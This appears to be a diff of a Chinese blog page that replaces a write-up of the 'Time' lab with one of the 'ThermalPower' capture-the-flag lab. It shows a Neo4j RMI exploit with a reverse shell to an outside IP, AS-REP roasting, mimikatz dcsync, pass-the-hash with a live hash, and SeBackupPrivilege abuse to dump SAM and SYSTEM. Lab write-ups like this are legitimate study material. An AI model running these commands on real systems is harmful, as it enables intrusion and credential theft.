@@ -19,28 +19,22 @@
   <meta name="author" content="fearless123">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Time 入口机漏洞: neo4j的rmi协议的反序列漏洞Neo4j 的 Shell Server 在启用时会暴露一个 RMI 服务。攻击者可以利用 Rhino 库中的已知漏洞链，通过构造恶意对象并调用 setSessionVariable 方法，触发反序列化漏洞，执行任意命令。此漏洞不依赖于 Java 版本，因为它并非传统的 RMI 反序列化漏洞。 在 Neo4j 3.5 及之后的版本，Neo4">
+    <meta name="description" content="春秋云境之thermalpower入口机heapdump内存泄露，利用工具解密拿到key，然后打一个shiro反序列化注入内存马拿shell  SeBackupPrivilege 提权SeBackupPrivilege 权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。 diskshadow 是 Windows 的内置功能，可以帮助创建备份。参考 hacking">
 <meta property="og:type" content="article">
-<meta property="og:title" content="春秋云镜之time">
-<meta property="og:url" content="http://fearless-123.github.io/2025/09/24/Time/index.html">
+<meta property="og:title" content="春秋云境之thermalpower">
+<meta property="og:url" content="http://fearless-123.github.io/2025/09/24/%E6%B8%97%E9%80%8F/thermalpower/index.html">
 <meta property="og:site_name" content="fearless123">
-<meta property="og:description" content="Time 入口机漏洞: neo4j的rmi协议的反序列漏洞Neo4j 的 Shell Server 在启用时会暴露一个 RMI 服务。攻击者可以利用 Rhino 库中的已知漏洞链，通过构造恶意对象并调用 setSessionVariable 方法，触发反序列化漏洞，执行任意命令。此漏洞不依赖于 Java 版本，因为它并非传统的 RMI 反序列化漏洞。 在 Neo4j 3.5 及之后的版本，Neo4">
+<meta property="og:description" content="春秋云境之thermalpower入口机heapdump内存泄露，利用工具解密拿到key，然后打一个shiro反序列化注入内存马拿shell  SeBackupPrivilege 提权SeBackupPrivilege 权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。 diskshadow 是 Windows 的内置功能，可以帮助创建备份。参考 hacking">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://fearless-123.github.io/Time/376f47a9c35f40af923e89d54269546a.png">
-<meta property="og:image" content="http://fearless-123.github.io/Time/image-20250924002333323.png">
-<meta property="og:image" content="http://fearless-123.github.io/Time/image-20250924003259018.png">
-<meta property="og:image" content="http://fearless-123.github.io/Time/image-20250924004934358.png">
-<meta property="og:image" content="http://fearless-123.github.io/Time/9f67b4180323bb300f4fd0357e9b1434.png">
 <meta property="article:published_time" content="2025-09-23T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-09-23T17:06:46.009Z">
+<meta property="article:modified_time" content="2025-10-24T16:07:00.632Z">
 <meta property="article:author" content="fearless123">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://fearless-123.github.io/Time/376f47a9c35f40af923e89d54269546a.png">
   
   
   
-  <title>春秋云镜之time - fearless123</title>
+  <title>春秋云境之thermalpower - fearless123</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -219,7 +213,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="春秋云镜之time"></span>
+            <span id="subtitle" data-typed-text="春秋云境之thermalpower"></span>
           
         </div>
 
@@ -242,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          266 字
         
       </span>
     
@@ -253,7 +247,7 @@
         
         
         
-          10 分钟
+          3 分钟
         
       </span>
     
@@ -299,53 +293,37 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">春秋云镜之time</h1>
+            <h1 id="seo-header">春秋云境之thermalpower</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h1><p><img src="/../Time/376f47a9c35f40af923e89d54269546a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h2 id="入口机漏洞-neo4j的rmi协议的反序列漏洞"><a href="#入口机漏洞-neo4j的rmi协议的反序列漏洞" class="headerlink" title="入口机漏洞: neo4j的rmi协议的反序列漏洞"></a>入口机漏洞: neo4j的rmi协议的反序列漏洞</h2><p>Neo4j 的 Shell Server 在启用时会暴露一个 RMI 服务。攻击者可以利用 Rhino 库中的已知漏洞链，通过构造恶意对象并调用 <em>setSessionVariable</em> 方法，触发反序列化漏洞，执行任意命令。此漏洞不依赖于 Java 版本，因为它并非传统的 RMI 反序列化漏洞。</p>
-<p>在 <strong>Neo4j 3.5 及之后的版本</strong>，Neo4j Shell 被 Cyber Shell 替代，从而修复了该漏洞</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">java -jar rhino_gadget.jar rmi://39.98.119.66:1337 &quot;bash -c </span><span class="hljs-template-variable">&#123;echo,YmFza...MDA3NyAwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>直接弹shell拿flag1，然后传fscan，stowaway，内网渗透，172.22.6.38有一个web服务，sqlmap注入拿flag2，同时发现很多用户</p>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----+</span>------------------<span class="hljs-code">+---------------+</span><br><span class="hljs-section">| id | password         | username      |</span><br><span class="hljs-section">+----+------------------+---------------+</span><br><span class="hljs-section">| 1  | bo2y8kAL3HnXUiQo | administrator |</span><br><span class="hljs-section">+----+------------------+---------------+</span><br></code></pre></td></tr></table></figure>
-
-<p>在思考能不能试试登录这个然后甜土豆提权到system，然后再用猕猴桃抓取域管的哈希?</p>
-<p><img src="/../Time/image-20250924002333323.png" srcset="/img/loading.gif" lazyload alt="image-20250924002333323"></p>
-<p>这样子看应该不能，不然在这里就全剧终了（</p>
-<h2 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a>AS-REP Roasting攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><img src="/../Time/image-20250924003259018.png" srcset="/img/loading.gif" lazyload alt="image-20250924003259018"></p>
-<h4 id="1-Kerberos-认证的-“预身份验证”-机制"><a href="#1-Kerberos-认证的-“预身份验证”-机制" class="headerlink" title="1. Kerberos 认证的 “预身份验证” 机制"></a>1. Kerberos 认证的 “预身份验证” 机制</h4><p>Kerberos 认证的第一步是<strong>向域控制器的 “认证服务（AS）” 请求票据授予票（TGT）</strong>。为了防止攻击者 “盲猜” 用户名并请求 TGT，Kerberos 设计了<strong>预身份验证（Pre-Authentication）</strong>：用户必须先通过自己的凭据（如 NTLM 哈希）向 AS “证明身份”，AS 才会响应 TGT 请求。这相当于 “先验明正身，再给票据”，能有效阻止无差别请求。</p>
-<h4 id="2-AS-REP-Roasting-的攻击逻辑"><a href="#2-AS-REP-Roasting-的攻击逻辑" class="headerlink" title="2. AS_REP Roasting 的攻击逻辑"></a>2. AS_REP Roasting 的攻击逻辑</h4><p>当某个<strong>域用户的 “不需要 Kerberos 预身份验证” 选项被开启</strong>（即 “预身份验证被禁用”）时，攻击可发生：</p>
-<ul>
-<li>攻击者无需证明自己是目标用户，可<strong>伪造任意用户名</strong>，直接向 AS 请求该用户的 TGT。</li>
-<li>AS 收到请求后，因目标用户 “免预验证”，会返回<strong>AS_REP（认证服务响应）</strong>。这个 AS_REP 中，包含了<strong>用目标用户 NTLM 哈希加密的内容</strong>（比如会话密钥）。</li>
-<li>攻击者拿到 AS_REP 后，可对其中 “用用户哈希加密的部分” 进行<strong>暴力破解</strong>（用 Hashcat、John 等工具），尝试还原出用户的 NTLM 哈希（甚至明文密码）。若破解成功，就能获取该用户的凭据，用于后续渗透。</li>
-</ul>
-<h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><h4 id="验证真实有效的用户"><a href="#验证真实有效的用户" class="headerlink" title="验证真实有效的用户"></a>验证真实有效的用户</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> userenum -d xiaorang<span class="hljs-selector-class">.lab</span> <span class="hljs-attr">--dc</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">6.12</span> user<span class="hljs-selector-class">.txt</span> -t <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
-
-<p>这条命令的目的是：通过<code>kerbrute</code>工具，向<code>xiaorang.lab</code>域的域控制器（<code>172.22.6.12</code>）发送请求，利用<code>user.txt</code>中的用户名列表，枚举该域中真实存在的有效用户账户。</p>
-<h4 id="抓取免预认证的用户响应"><a href="#抓取免预认证的用户响应" class="headerlink" title="抓取免预认证的用户响应"></a>抓取免预认证的用户响应</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> python3 GetNPUsers.py -dc-ip <span class="hljs-number">172.22.6.12</span> -usersfile yu_user.txt xiaorang.lab/<br></code></pre></td></tr></table></figure>
-
-<p>向域控制器发送请求，检测指定用户列表中哪些用户 “禁用了 Kerberos 预认证”，并获取这些用户的<code>AS_REP</code>响应（包含用用户哈希加密的内容），然后用john离线破解hash，得到了两个用户的登录密码。</p>
-<p>登录后，因为是域用户，可以直接上sharpHound收集一下域内的信息。</p>
-<p><img src="/../Time/image-20250924004934358.png" srcset="/img/loading.gif" lazyload alt="image-20250924004934358"></p>
-<h2 id="SIDHistory的滥用"><a href="#SIDHistory的滥用" class="headerlink" title="SIDHistory的滥用"></a>SIDHistory的滥用</h2><p>发现yuxuan用户非常可疑</p>
-<p>query user查看本机登录用户信息，发现了该用户，然后在注册表找到了该用户的账号密码，rdp登录</p>
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p>SID（Security Identifier，安全标识符）是 Windows 系统中唯一标识用户、组、计算机等安全主体的 “数字身份证”，系统通过 SID 判断主体的访问权限（而非用户名）。SIDHistory 的设计初衷是<strong>支持跨域迁移时的权限平滑过渡</strong>，避免迁移后用户失去对原域资源的访问权。</p>
-<p><code>YUXUAN</code> 与 <code>ADMINISTRATOR</code> 之间的 <code>HasSidHistory</code> 边，表明 <code>YUXUAN</code> 的 <code>SIDHistory</code> 中被植入了 “管理员 <code>ADMINISTRATOR</code> 的 SID”。根据 Windows 权限验证规则：<strong>系统会同时检查用户的 <code>objectSid</code>（自身 SID）和 <code>SIDHistory</code> 中的所有 SID，只要其中一个 SID 有对应权限，就允许访问</strong>。因此，<code>YUXUAN</code> 会<strong>继承管理员的所有权限</strong>。</p>
-<p>既然yuxuan具有域管的权限，那么直接上次猕猴桃抓取域内所有用户的ntml哈希，其中包括域管的哈希，然后打一个pth的横向移动即可控制所有主机</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:xiaorang.lab /all /csv <span class="hljs-comment">#Mimikatz 工具中用于从域控制器（DC）同步并导出域内用户凭证信息的命令</span><br></code></pre></td></tr></table></figure>
-
-<p>这条命令依赖的是域管的权限</p>
-<p><img src="/../Time/9f67b4180323bb300f4fd0357e9b1434.png" srcset="/img/loading.gif" lazyload alt="9f67b4180323bb300f4fd0357e9b1434"></p>
-<p>这个方法没打通是应该是因为我拿不到这台机子本地管理员的权限</p>
-<h4 id="pth拿flag"><a href="#pth拿flag" class="headerlink" title="pth拿flag"></a>pth拿flag</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> impacket-smbexec -hashes :<span class="hljs-number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="hljs-number">172.22.6.25</span> -codec gbk<br></code></pre></td></tr></table></figure>
-
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> impacket-smbexec -hashes :<span class="hljs-number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="hljs-number">172.22.6.12</span> -codec gbk<br></code></pre></td></tr></table></figure>
+                <h1 id="春秋云境之thermalpower"><a href="#春秋云境之thermalpower" class="headerlink" title="春秋云境之thermalpower"></a>春秋云境之thermalpower</h1><h2 id="入口机"><a href="#入口机" class="headerlink" title="入口机"></a>入口机</h2><p>heapdump内存泄露，利用工具解密拿到key，然后打一个shiro反序列化注入内存马拿shell </p>
+<h2 id="SeBackupPrivilege-提权"><a href="#SeBackupPrivilege-提权" class="headerlink" title="SeBackupPrivilege 提权"></a>SeBackupPrivilege 提权</h2><p>SeBackupPrivilege 权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。</p>
+<p><strong>diskshadow</strong> 是 Windows 的内置功能，可以帮助创建备份。参考 hackingarticles，可以在本地或 DC 进行权限提升。</p>
+<p>Privilege 靶场中也使用该方式实现权限提升。ThermalPower 只涉及本地权限提升，不涉及 DC。</p>
+<p>powershell使用 <a target="_blank" rel="noopener" href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1">EnableSeBackupPrivilege.ps1</a>启用 SeBackupPrivilege：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\EnableSeBackupPrivilege.ps1<br></code></pre></td></tr></table></figure>
 
 
+
+<p>新建 s.dsh 文件</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> context <span class="hljs-comment">persistent nowriters</span><br>add <span class="hljs-comment">volume c: alias mydrive</span><br>create<br>expose <span class="hljs-comment">%mydrive% z:</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果是linux生成的要转换编码和间距</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">unix2dos</span> s.dsh<br></code></pre></td></tr></table></figure>
+
+
+
+<p>以管理员权限在 PowerShell 中执行命令。当前用户路径权限不够，需要在 C 盘新建目录 Temp，执行 diskshadow 并拷贝 flag02 </p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">PS C:<span class="hljs-string">\Users\chenhua\Desktop&gt;</span> cd C:<span class="hljs-string">\</span><br>PS C:<span class="hljs-string">\Users\chenhua\Desktop&gt;</span> mkdir Temp<br>PS C:<span class="hljs-string">\Temp&gt;</span> diskshadow /s s.dsh<br>PS C:<span class="hljs-string">\Temp&gt;</span> dir z:<span class="hljs-string">\Users\Administrator\flag\</span><br>PS C:<span class="hljs-string">\Temp&gt;</span> robocopy /b z:<span class="hljs-string">\Users\Administrator\flag\</span> . flag02.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p>也可以保存注册表来获取本地凭证</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">mkdir c:<span class="hljs-string">\Tmp</span><br>reg save hklm<span class="hljs-string">\system</span> c:<span class="hljs-string">\Tmp\system</span><br>reg save hklm<span class="hljs-string">\sam</span> c:<span class="hljs-string">\Tmp\sam</span><br></code></pre></td></tr></table></figure>
 
 
                 
@@ -392,8 +370,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>春秋云镜之time</div>
-      <div>http://fearless-123.github.io/2025/09/24/Time/</div>
+      <div>春秋云境之thermalpower</div>
+      <div>http://fearless-123.github.io/2025/09/24/渗透/thermalpower/</div>
     </div>
     <div class="license-meta">
       
@@ -437,11 +415,17 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2025/09/24/%E6%B8%97%E9%80%8F/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" title="永恒之蓝">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">永恒之蓝</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/08/31/Tsclient/" title="春秋云镜之Tsclient">
+                      <a href="/2025/08/31/%E6%B8%97%E9%80%8F/Tsclient/" title="春秋云镜之Tsclient">
                         <span class="hidden-mobile">春秋云镜之Tsclient</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
